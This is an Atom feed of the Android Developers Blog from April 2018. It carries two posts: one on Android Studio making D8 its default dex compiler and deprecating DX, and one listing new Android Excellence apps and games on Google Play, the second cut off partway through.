<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" media="screen" href="/~d/styles/atom10full.xsl"?>
<?xml-stylesheet type="text/css" media="screen" href="http://feeds.feedburner.com/~d/styles/itemcontent.css"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:openSearch="http://a9.com/-/spec/opensearchrss/1.0/" xmlns:blogger="http://schemas.google.com/blogger/2008" xmlns:georss="http://www.georss.org/georss" xmlns:gd="http://schemas.google.com/g/2005" xmlns:thr="http://purl.org/syndication/thread/1.0" xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">
  <id>tag:blogger.com,1999:blog-6755709643044947179</id>
  <updated>2018-04-06T14:55:45.701-07:00</updated>
  <category term="Featured"/>
  <category term="Google Play"/>
  <category term="Android"/>
  <category term="Develop"/>
  <category term="Android Developer"/>
  <category term="Games"/>
  <category term="archive"/>
  <category term="Announcements"/>
  <category term="Apps"/>
  <category term="Google Play services"/>
  <category term="Android Studio"/>
  <category term="Android Wear"/>
  <category term="Security"/>
  <category term="Distribute"/>
  <category term="Google Services"/>
  <category term="User Interface"/>
  <category term="NDK"/>
  <category term="Android N"/>
  <category term="Design"/>
  <category term="SDK updates"/>
  <category term="Developer Console"/>
  <category term="Google Play game services"/>
  <category term="Developer Preview"/>
  <category term="android developers"/>
  <category term="How-to"/>
  <category term="Android Developer Challenge"/>
  <category term="Google Play Games"/>
  <category term="GooglePlay"/>
  <category term="Android Market"/>
  <category term="Android TV"/>
  <category term="AndroidDevStory"/>
  <category term="Material Design"/>
  <category term="Game"/>
  <category term="Play Console"/>
  <category term="Tools"/>
  <category term="Android 1.5"/>
  <category term="App"/>
  <category term="Story"/>
  <category term="Google I/O"/>
  <category term="Google Play Console"/>
  <category term="developers"/>
  <category term="Android Design"/>
  <category term="Best Practices"/>
  <category term="Android O"/>
  <category term="Marshmallow"/>
  <category term="Optimization"/>
  <category term="Performance"/>
  <category term="Support Library"/>
  <category term="UI"/>
  <category term="developer"/>
  <category term="wear"/>
  <category term="Android 1.6"/>
  <category term="Android Auto"/>
  <category term="Google Analytics"/>
  <category term="Udacity"/>
  <category term="Android Things"/>
  <category term="Android 5.0"/>
  <category term="AndroidO"/>
  <category term="Location"/>
  <category term="appstory"/>
  <category term="engagement"/>
  <category term="Android Instant Apps"/>
  <category term="Google"/>
  <category term="Google Cloud Messaging"/>
  <category term="Google Cloud Platform"/>
  <category term="IoT"/>
  <category term="Layout"/>
  <category term="Localization"/>
  <category term="London"/>
  <category term="Tablets"/>
  <category term="UI toolkit"/>
  <category term="admob"/>
  <category term="analytics"/>
  <category term="developerstory"/>
  <category term="permissions"/>
  <category term="API"/>
  <category term="Android M"/>
  <category term="App quality"/>
  <category term="C++"/>
  <category term="Google Cast"/>
  <category term="Graphics"/>
  <category term="IO2013"/>
  <category term="Renderscript"/>
  <category term="Testing"/>
  <category term="compatibility"/>
  <category term="notifications"/>
  <category term="‘Google Play"/>
  <category term="Android 2.0"/>
  <category term="App Resources"/>
  <category term="Europe"/>
  <category term="Google Fit"/>
  <category term="Google Play games services"/>
  <category term="Media and Camera"/>
  <category term="Open source"/>
  <category term="OpenGL ES"/>
  <category term="Quality"/>
  <category term="androidn"/>
  <category term="business"/>
  <category term="competition"/>
  <category term="contest"/>
  <category term="gamestory"/>
  <category term="grow"/>
  <category term="io15"/>
  <category term="monetization"/>
  <category term="prizes"/>
  <category term="users"/>
  <category term="win"/>
  <category term="Android 4.2"/>
  <category term="Android 6.0"/>
  <category term="Android Vitals"/>
  <category term="Android for Work"/>
  <category term="AndroidWear"/>
  <category term="App Components"/>
  <category term="Audio"/>
  <category term="Code Day"/>
  <category term="Courses"/>
  <category term="Developer profiles"/>
  <category term="Education"/>
  <category term="GDC"/>
  <category term="Google Drive"/>
  <category term="Google Mobile Ads"/>
  <category term="IO2014"/>
  <category term="In-app Billing"/>
  <category term="Intents"/>
  <category term="Kotlin"/>
  <category term="Launch"/>
  <category term="Licensing"/>
  <category term="Pixel"/>
  <category term="Saatchi"/>
  <category term="Sample code"/>
  <category term="Samples"/>
  <category term="indie"/>
  <category term="indies"/>
  <category term="showcase"/>
  <category term="signing"/>
  <category term="wifi"/>
  <category term="#io17"/>
  <category term="APIs"/>
  <category term="Activity Recognition"/>
  <category term="Ads"/>
  <category term="Android 3.0"/>
  <category term="Android 3.2"/>
  <category term="Android 4.4"/>
  <category term="Android SDK"/>
  <category term="Animation"/>
  <category term="App Indexing"/>
  <category term="Authentication"/>
  <category term="Bluetooth"/>
  <category term="Developer Labs"/>
  <category term="Development Tools"/>
  <category term="Early Access"/>
  <category term="Firebase"/>
  <category term="Fragments"/>
  <category term="GCM"/>
  <category term="Google Assistant"/>
  <category term="Google Maps"/>
  <category term="Google Play for Work"/>
  <category term="Google client API"/>
  <category term="Google+"/>
  <category term="Indie Contest"/>
  <category term="Indie games contest"/>
  <category term="Input methods"/>
  <category term="LiquidFun"/>
  <category term="Maps"/>
  <category term="Maps API"/>
  <category term="MaterialDesign"/>
  <category term="Privacy"/>
  <category term="Project Treble"/>
  <category term="SDK Tools"/>
  <category term="Subscription"/>
  <category term="Text and Input"/>
  <category term="VR"/>
  <category term="Virtual Reality"/>
  <category term="WebView"/>
  <category term="android oreo"/>
  <category term="apk"/>
  <category term="developergamestory"/>
  <category term="events"/>
  <category term="google play for families"/>
  <category term="growth"/>
  <category term="mobile vision APIs"/>
  <category term="nearby"/>
  <category term="oreo"/>
  <category term="ubicomp"/>
  <category term="Action Bar"/>
  <category term="Actions"/>
  <category term="Android 2.1"/>
  <category term="Android 2.2"/>
  <category term="Android 2.3"/>
  <category term="Android 7.0"/>
  <category term="Android 71"/>
  <category term="Android Developer Phone"/>
  <category term="Android Go"/>
  <category term="Android Pay API"/>
  <category term="Android Studio 3.0"/>
  <category term="Android Wear 2.0"/>
  <category term="Animation and Graphics"/>
  <category term="AppCompat"/>
  <category term="BLE"/>
  <category term="Beta"/>
  <category term="Boston"/>
  <category term="Canary"/>
  <category term="Connectivity"/>
  <category term="Dashboard"/>
  <category term="Daydream"/>
  <category term="Developer Console Store Listing Experiments"/>
  <category term="Efficient Apps"/>
  <category term="GLSL"/>
  <category term="Global"/>
  <category term="Google Play Billing"/>
  <category term="Google Wallet"/>
  <category term="GoogleAPIClient"/>
  <category term="Guidelines"/>
  <category term="HTTPS"/>
  <category term="I/O2014"/>
  <category term="IME"/>
  <category term="Identity"/>
  <category term="Indie Games"/>
  <category term="Internet of Things"/>
  <category term="JNI"/>
  <category term="Java"/>
  <category term="Java 8"/>
  <category term="LVL"/>
  <category term="LondonEng"/>
  <category term="Memory Management"/>
  <category term="Nougat"/>
  <category term="OpenGL"/>
  <category term="Places"/>
  <category term="Play Store"/>
  <category term="PlayStore"/>
  <category term="Preview"/>
  <category term="Profiling"/>
  <category term="Pure"/>
  <category term="SEA"/>
  <category term="SafetyNet"/>
  <category term="Screens"/>
  <category term="Southeast Asia"/>
  <category term="TV"/>
  <category term="TensorFlow"/>
  <category term="Text-to-Speech"/>
  <category term="Treble"/>
  <category term="UX"/>
  <category term="Unity"/>
  <category term="User Support"/>
  <category term="Web"/>
  <category term="Widgets"/>
  <category term="beacons"/>
  <category term="buildingforbillions"/>
  <category term="chrome"/>
  <category term="conversions"/>
  <category term="documentation"/>
  <category term="game design"/>
  <category term="google computer science"/>
  <category term="hackster"/>
  <category term="iOS"/>
  <category term="in-app purchase"/>
  <category term="infinite deviation: games"/>
  <category term="io2010"/>
  <category term="social impact"/>
  <category term="store listing experiments"/>
  <category term="subscriptions"/>
  <category term="things"/>
  <category term="update"/>
  <category term="user data"/>
  <category term="watch face API"/>
  <category term="#Android #Android development # advanced Android #learn Android #build Android apps #Udacity"/>
  <category term="#AndroidTV #Google Cast #Udacity"/>
  <category term="#GDC17 #GoogleDeveloperDay #GooglePlay #Games #VR #Daydream #Developers #Android #Google Play"/>
  <category term="#GPA2017 #GooglePlayAwards #GooglePlay #Games #VR #AR #AndroidWear #Indies #Startup #Apps #Developers #Android #Google Play"/>
  <category term="#io16"/>
  <category term="'Google Play"/>
  <category term="3d"/>
  <category term="505 Games"/>
  <category term="8.1"/>
  <category term="AIY"/>
  <category term="AIY Projects"/>
  <category term="AMP"/>
  <category term="APK Expansion Files"/>
  <category term="ARPU"/>
  <category term="ATSL"/>
  <category term="About Fun"/>
  <category term="Actions on Google"/>
  <category term="Administration"/>
  <category term="Advanced Android course"/>
  <category term="Advanced Android training"/>
  <category term="Agus Gomez"/>
  <category term="Android 2.3.3"/>
  <category term="Android 4.0"/>
  <category term="Android 4.3"/>
  <category term="Android 5.1"/>
  <category term="Android 7.1"/>
  <category term="Android 8.1"/>
  <category term="Android C++"/>
  <category term="Android Emulator"/>
  <category term="Android Excellence"/>
  <category term="Android IDE"/>
  <category term="Android O Developer Preview"/>
  <category term="Android One"/>
  <category term="Android Pay"/>
  <category term="Android Security Rewards"/>
  <category term="Android Testing Support Library"/>
  <category term="AndroidThings"/>
  <category term="AnswerLab"/>
  <category term="Architecture"/>
  <category term="Architecture Components"/>
  <category term="Assistant"/>
  <category term="Assistant SDK"/>
  <category term="Auto Backup"/>
  <category term="Autofill Framework"/>
  <category term="BABBQ"/>
  <category term="Betatesting"/>
  <category term="Billions"/>
  <category term="Budge Studios"/>
  <category term="C"/>
  <category term="Certificates"/>
  <category term="Certification"/>
  <category term="Channels"/>
  <category term="Chromebooks"/>
  <category term="Cloud Speech API"/>
  <category term="Commerce"/>
  <category term="Complications"/>
  <category term="Contacts"/>
  <category term="Content Provider"/>
  <category term="Cool Stuff"/>
  <category term="CultureAlley"/>
  <category term="DAC/Design"/>
  <category term="DAC/Develop"/>
  <category term="DP3"/>
  <category term="Debugging"/>
  <category term="Demographics"/>
  <category term="Developer Days"/>
  <category term="DialogFragment"/>
  <category term="Disruptor Beam"/>
  <category term="Doze"/>
  <category term="Driving Do Not Disturb"/>
  <category term="EA"/>
  <category term="Editors’ Choice"/>
  <category term="Electronic Arts"/>
  <category term="Engage"/>
  <category term="Enterprise"/>
  <category term="Fast Pair"/>
  <category term="Finance"/>
  <category term="Fortify"/>
  <category term="Fundamentals"/>
  <category term="GDC17"/>
  <category term="GNSS"/>
  <category term="GPGS"/>
  <category term="GPS"/>
  <category term="Gareth Jones"/>
  <category term="Gboard"/>
  <category term="Gestures"/>
  <category term="Gmail"/>
  <category term="Golf Clash"/>
  <category term="Google APIs"/>
  <category term="Google Apps"/>
  <category term="Google Awareness API"/>
  <category term="Google Now"/>
  <category term="Google Sign-In"/>
  <category term="GoogleDeveloperDay"/>
  <category term="Gpfe"/>
  <category term="GridLayout"/>
  <category term="HAL"/>
  <category term="HelloEnglish"/>
  <category term="Holo"/>
  <category term="HttpsURLConnection"/>
  <category term="Hutch"/>
  <category term="Hutch Games"/>
  <category term="Image Processing"/>
  <category term="Indie games developers"/>
  <category term="Indonesia"/>
  <category term="Indonesia Games Contest"/>
  <category term="Instant Apps"/>
  <category term="Inzen studio"/>
  <category term="Issue Tracker"/>
  <category term="Job Scheduler"/>
  <category term="Job Service"/>
  <category term="KNOX"/>
  <category term="Keyboard"/>
  <category term="Klei Entertainment"/>
  <category term="LTV"/>
  <category term="LaMatinale"/>
  <category term="LeMonde"/>
  <category term="Life of a Bug"/>
  <category term="Lollipop"/>
  <category term="MENA"/>
  <category term="Marta Gui"/>
  <category term="Mountain View"/>
  <category term="Multiwindow"/>
  <category term="Munich"/>
  <category term="NBU"/>
  <category term="NFC"/>
  <category term="Niji Games"/>
  <category term="Nix Hydra"/>
  <category term="Now in Arabic"/>
  <category term="OAuth"/>
  <category term="Omnidrone"/>
  <category term="On-Device Machine Learning"/>
  <category term="Onboarding"/>
  <category term="P2P"/>
  <category term="PWA"/>
  <category term="Paul Gouge"/>
  <category term="Photo Sphere"/>
  <category term="Physics"/>
  <category term="Pico"/>
  <category term="Playdemic"/>
  <category term="Playtime 2016"/>
  <category term="Pocket Gems"/>
  <category term="Policy"/>
  <category term="Promo Graphics"/>
  <category term="Public Tracker"/>
  <category term="Quick Search Box"/>
  <category term="RTL"/>
  <category term="Resources"/>
  <category term="Robinhood"/>
  <category term="Safe Browsing"/>
  <category term="Schell Games"/>
  <category term="ScreenCapture"/>
  <category term="Sensors"/>
  <category term="Seriously"/>
  <category term="ShareActionProvider"/>
  <category term="Shared Elements"/>
  <category term="Sharing"/>
  <category term="Shortcuts"/>
  <category term="Skyscanner"/>
  <category term="Smartlock"/>
  <category term="Social Point"/>
  <category term="Space"/>
  <category term="Space Ape Games"/>
  <category term="Speech Input"/>
  <category term="Stencils"/>
  <category term="Stickers"/>
  <category term="Storage"/>
  <category term="Storytoys"/>
  <category term="Studio"/>
  <category term="Super Evil MegaCorp"/>
  <category term="Survey"/>
  <category term="TAGS: Google Play"/>
  <category term="TLS"/>
  <category term="Tel Aviv"/>
  <category term="Telephony"/>
  <category term="Tips"/>
  <category term="Titan Brawl"/>
  <category term="Touch"/>
  <category term="Translation"/>
  <category term="User Feedback"/>
  <category term="VGames"/>
  <category term="Visibility"/>
  <category term="Vitals"/>
  <category term="Voice"/>
  <category term="Voice Kit"/>
  <category term="Wear OS"/>
  <category term="Wear UI Library"/>
  <category term="Webdriver"/>
  <category term="World Food Day"/>
  <category term="XmlPullParser"/>
  <category term="YouTube"/>
  <category term="accessibility"/>
  <category term="android 8.0"/>
  <category term="android c++ games linux open source release osx serialization windows"/>
  <category term="android extension pack"/>
  <category term="android o apis"/>
  <category term="android p"/>
  <category term="android sanitizer"/>
  <category term="android security"/>
  <category term="android wear 1.0"/>
  <category term="android71"/>
  <category term="android81"/>
  <category term="androidoreo"/>
  <category term="androidp"/>
  <category term="app attribution"/>
  <category term="app id"/>
  <category term="app install"/>
  <category term="app updates"/>
  <category term="ar"/>
  <category term="arch"/>
  <category term="arcore"/>
  <category term="attestation"/>
  <category term="augmented reality"/>
  <category term="autofill"/>
  <category term="awareness"/>
  <category term="bar code"/>
  <category term="beacon"/>
  <category term="beta testing"/>
  <category term="betatesting GooglePlayforFamilies"/>
  <category term="big data"/>
  <category term="billing"/>
  <category term="blackhat"/>
  <category term="bug swatting"/>
  <category term="clang"/>
  <category term="class loading"/>
  <category term="constraintlayout"/>
  <category term="context"/>
  <category term="cross-platform"/>
  <category term="d8"/>
  <category term="dalvik"/>
  <category term="data storage"/>
  <category term="ddms"/>
  <category term="deeplocal"/>
  <category term="developer story"/>
  <category term="developerappstory"/>
  <category term="developerstory developerconsole"/>
  <category term="device id"/>
  <category term="dexer"/>
  <category term="dx"/>
  <category term="eBook"/>
  <category term="emulator"/>
  <category term="face detection"/>
  <category term="families"/>
  <category term="fitness"/>
  <category term="free trial"/>
  <category term="game-as-a-service"/>
  <category term="gapid"/>
  <category term="gdc18"/>
  <category term="go edition"/>
  <category term="gold"/>
  <category term="golf games"/>
  <category term="google play protect"/>
  <category term="google security"/>
  <category term="googleservices"/>
  <category term="guide"/>
  <category term="http"/>
  <category term="install referrer"/>
  <category term="install track"/>
  <category term="installs"/>
  <category term="instant"/>
  <category term="internet"/>
  <category term="intuit"/>
  <category term="io16"/>
  <category term="kernel"/>
  <category term="keys"/>
  <category term="kids app developers"/>
  <category term="kids apps"/>
  <category term="ktx"/>
  <category term="leanback"/>
  <category term="learning"/>
  <category term="library"/>
  <category term="listing"/>
  <category term="liveops"/>
  <category term="long aspect ratio"/>
  <category term="machine"/>
  <category term="malware"/>
  <category term="memory"/>
  <category term="messaging api"/>
  <category term="mobile ads"/>
  <category term="mobile search"/>
  <category term="motion."/>
  <category term="multiplayer"/>
  <category term="network"/>
  <category term="of"/>
  <category term="official launch"/>
  <category term="offline"/>
  <category term="ordered broadcast"/>
  <category term="packaging"/>
  <category term="peer group"/>
  <category term="people"/>
  <category term="phone"/>
  <category term="play"/>
  <category term="play billing"/>
  <category term="play billing library"/>
  <category term="playbook app"/>
  <category term="protection"/>
  <category term="publishing"/>
  <category term="pwn"/>
  <category term="ratings"/>
  <category term="recaptcha"/>
  <category term="revenue"/>
  <category term="reviews"/>
  <category term="robotics"/>
  <category term="runtime permissions"/>
  <category term="sandbox"/>
  <category term="sanitizer"/>
  <category term="sdk"/>
  <category term="security infrastructure"/>
  <category term="selinux"/>
  <category term="source code"/>
  <category term="spam"/>
  <category term="spyware"/>
  <category term="stability"/>
  <category term="storelistingexperime"/>
  <category term="strictmode"/>
  <category term="success stories"/>
  <category term="targeted spyware"/>
  <category term="threading"/>
  <category term="traceview"/>
  <category term="transition api"/>
  <category term="transitions"/>
  <category term="trial period"/>
  <category term="user experience"/>
  <category term="viewpager"/>
  <category term="vulkan"/>
  <category term="watch faces"/>
  <category term="wearos"/>
  <title type="text">Android Developers Blog</title>
  <subtitle type="html">An Open Handset Alliance Project.</subtitle>
  <link rel="alternate" type="text/html" href="http://android-developers.googleblog.com/"/>
  <link rel="next" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default?start-index=26&amp;max-results=25&amp;redirect=false"/>
  <author>
    <name>Ian Lake</name>
    <email>noreply@blogger.com</email>
    <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="32" height="32" src="//lh6.googleusercontent.com/-OUzGFk65pKc/AAAAAAAAAAI/AAAAAAAAADI/3yDSSNVmQVs/s512-c/photo.jpg"/>
  </author>
  <generator version="7.00" uri="http://www.blogger.com">Blogger</generator>
  <openSearch:totalResults>865</openSearch:totalResults>
  <openSearch:startIndex>1</openSearch:startIndex>
  <openSearch:itemsPerPage>25</openSearch:itemsPerPage>
  <atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="self" type="application/atom+xml" href="http://feeds.feedburner.com/blogspot/hsDu"/>
  <feedburner:info uri="blogspot/hsdu"/>
  <atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="hub" href="http://pubsubhubbub.appspot.com/"/>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-7838677620775070997</id>
    <published>2018-04-06T10:08:00.000-07:00</published>
    <updated>2018-04-06T10:21:23.511-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android Studio"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="d8"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="dexer"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="dx"/>
    <title type="text">Android Studio switching to D8 dexer</title>
    <content type="html">&lt;meta name="twitter:image" content="https://4.bp.blogspot.com/-0i4NURYYE8Y/Wseo9JothfI/AAAAAAAAFMY/fztvWDhhcG4X6vqgF5jrL0c6G-Ru9Fj_wCLcBGAs/s1600/dx%2Bv%2Bd8.png"&gt;
&lt;meta property="og:image" content="https://4.bp.blogspot.com/-0i4NURYYE8Y/Wseo9JothfI/AAAAAAAAFMY/fztvWDhhcG4X6vqgF5jrL0c6G-Ru9Fj_wCLcBGAs/s1600/dx%2Bv%2Bd8.png"&gt;

&lt;em&gt;Posted by Jeffrey van Gogh, Software Engineering Manager&lt;/em&gt;

&lt;p&gt;
&lt;strong&gt;D8 now default dex compiler&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Faster, smarter app compilation is always a goal for the Android tools teams. That's why we previously announced &lt;a href="https://android-developers.googleblog.com/2017/08/next-generation-dex-compiler-now-in.html"&gt;D8&lt;/a&gt;, a next-generation dex compiler.  D8 runs faster and produces smaller .dex files with equivalent or better runtime performance when compared to the historic compiler - DX.
&lt;/p&gt;
&lt;p&gt;
We recently announced that D8 has become the default compiler in Android Studio 3.1.  If you haven't previously tried D8, we hope that you notice better, faster dex compilation as you make the switch.
&lt;/p&gt;
&lt;p&gt;
D8 was first shipped in Android Studio 3.0 as an opt-in feature.  In addition to our own rigorous testing, we've now seen it perform well in a wide variety of apps.  As a result, we're confident that D8 will work well for everyone who starts using it in 3.1.  However, if you do have issues, you can always revert to DX for now via this setting in your project's gradle.properties file:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;android.enableD8=false
&lt;/pre&gt;


&lt;p&gt;
If you do encounter something that causes you to disable D8, please &lt;a href="https://issuetracker.google.com/issues/new?component=192708&amp;template=840533"&gt;let us know&lt;/a&gt;!  
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Next Steps&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Our goal is to ensure that everyone has access to a fast, correct dex compiler.  So to avoid risking regressions for any of our users, we'll be deprecating DX in three phases
&lt;/p&gt;
&lt;p&gt;
The first phase is intended to prevent prematurely deprecating DX.  During this phase, DX will remain available in studio.  We'll fix critical issues in it, but there won't be new features.  This phase will last for at least six months, during which we'll evaluate any open D8 bugs to decide if there are regressions which would prevent some users from replacing DX with D8.  The first phase won't end until the team addresses all migration blockers.  We'll be paying extra attention to the bug tracker during this window, so If you encounter any of these regressions, please &lt;a href="https://issuetracker.google.com/issues/new?component=192708&amp;template=840533"&gt;file an issue&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;
Once we've seen a six month window without major regressions from DX to D8, we'll enter the second phase.  This phase will last for a year, and is intended to ensure that even complex projects have lots of time to migrate.  During this phase, we'll keep DX available, but we'll treat it as fully deprecated; we won't be fixing any issues.
&lt;/p&gt;
&lt;p&gt;
During the third and final phase, DX will be removed from Android Studio.  At this point, you'll need to use a legacy version of the Android Gradle Plugin in order to continue to build with DX.  
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=e61rG6aLfKc:rxJG4AuncPw:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=e61rG6aLfKc:rxJG4AuncPw:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=e61rG6aLfKc:rxJG4AuncPw:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/e61rG6aLfKc" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7838677620775070997"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7838677620775070997"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/e61rG6aLfKc/android-studio-switching-to-d8-dexer.html" title="Android Studio switching to D8 dexer"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/04/android-studio-switching-to-d8-dexer.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-7120919803876537620</id>
    <published>2018-04-05T11:35:00.000-07:00</published>
    <updated>2018-04-05T11:35:50.279-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android Developer"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="App"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Games"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <title type="text">Introducing new Android Excellence apps and games on Google Play</title>
    <content type="html">&lt;em&gt;Kacey Fahey, Developer Marketing, Google Play&lt;/em&gt;

&lt;p&gt;
Congratulations to the latest &lt;a href="https://play.google.com/store/apps/topic?id=campaign_editorial_3002b4f_android_excellence_apps&amp;hl=en"&gt;apps&lt;/a&gt; and &lt;a href="https://play.google.com/store/apps/topic?id=campaign_editorial_3002b50_android_excellence_games&amp;hl=en"&gt;games&lt;/a&gt; featured in the Android Excellence program on Google Play. As a reminder, these collections are refreshed every three months and recognize apps and games that set the bar for high quality, great user experience, and strong technical performance. 
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://3.bp.blogspot.com/-WKwBKUfq5lA/WsUNQfbmhuI/AAAAAAAAFMA/KH6RE2zupHMzTb2fAm_4jsjAbP8L8lr4wCLcBGAs/s1600/image1.jpg" imageanchor="1" &gt;&lt;img id="imageOne" border="0" src="https://3.bp.blogspot.com/-WKwBKUfq5lA/WsUNQfbmhuI/AAAAAAAAFMA/KH6RE2zupHMzTb2fAm_4jsjAbP8L8lr4wCLcBGAs/s1600/image1.jpg" data-original-width="1024" data-original-height="592" /&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;
If you're looking for some new apps, here are a few highlights.
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.adobe.lrmobile"&gt;Adobe Photoshop Lightroom CC&lt;/a&gt;: Capture, edit, and share your photos with the power of Lightroom on your mobile device. Use presets for quick and easy edits, or dive in with the advanced editing tools.
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=se.perigee.android.seven"&gt;Seven - 7 Minute Workout Training Challenge&lt;/a&gt;: Use this app to fit seven minute workouts into your busy lifestyle. Grab your phone, or even your Wear OS device to work out anywhere and anytime. Keep it up to earn achievements and join the 7 Club for even more support. 
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.sololearn"&gt;SoloLearn: Learn to Code for Free&lt;/a&gt;: Learn one of many new coding languages by joining a community of millions. Tap in to the 24/7 peer support, or create your own lessons to become a community influencer.&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
Here are a few of our favorite new games joining the collection.
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.fanatee.cody"&gt;CodyCross: Crossword Puzzles&lt;/a&gt;: Try this game for a fun new style of crossword puzzles. Play for free on adventure mode or subscribe for special themed packs, varying difficulty levels and fresh content added weekly.
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.kabam.marvelbattle"&gt;MARVEL Contest of Champions&lt;/a&gt;: Play with your favorite Marvel Super Heroes and Super Villians in iconic locations from the Marvel Universe. Assemble your team of champions to play through the exciting storyline and even build alliances with your friends.
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.etermax.orbital1"&gt;Orbital 1&lt;/a&gt;: Test your skills in this real-time multiplayer game with beautiful 3D graphics. Collect and upgrade fighters and weapons to build out your perfect squad for quick battles and new daily quests.&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
See the full list of Android Excellence apps and games.
&lt;/p&gt;

&lt;table&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;strong&gt;&lt;span style="text-decoration:underline;"&gt;New Android Excellence apps&lt;/span&gt;&lt;/strong&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;strong&gt;&lt;span style="text-decoration:underline;"&gt;New Android Excellence games&lt;/span&gt;&lt;/strong&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.adobe.lrmobile"&gt;Adobe Photoshop Lightroom CC&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.dashlane"&gt;Dashlane&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.hostelworld.app"&gt;Holstelworld&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.polydice.icook"&gt;iCook&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.callpod.android_apps.keeper"&gt;Keeper Password Manager&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.kii.safe"&gt;Keepsafe Photo Vault&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.mobisystems.office"&gt;Mobisystems OfficeSuite&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.roidapp.photogrid&amp;ddl=1&amp;pcampaignid=web_ddl_1&amp;e=-EnableAppDetailsPageRedesign"&gt;PhotoGrid&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.runtastic.android.results.lite&amp;sticky_source_country=US&amp;e=-EnableAppDetailsPageRedesign"&gt;Runtastic Results&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=se.perigee.android.seven"&gt;Seven - 7 Minute Workout Training Challenge&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.sololearn"&gt;SoloLearn: Learn to Code for Free&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.mxdata.tube.Market"&gt;Tube Map&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=cn.wps.moffice_eng"&gt;WPS Office&lt;/a&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.rovio.baba&amp;hl=en&amp;e=-EnableAppDetailsPageRedesign"&gt;Angry Birds 2&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.YoStarJP.AzurLane&amp;hl=en&amp;e=-EnableAppDetailsPageRedesign"&gt;Azur Lane&lt;/a&gt; アズールレーン
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.fanatee.cody"&gt;CodyCross&lt;/a&gt;
&lt;p&gt;
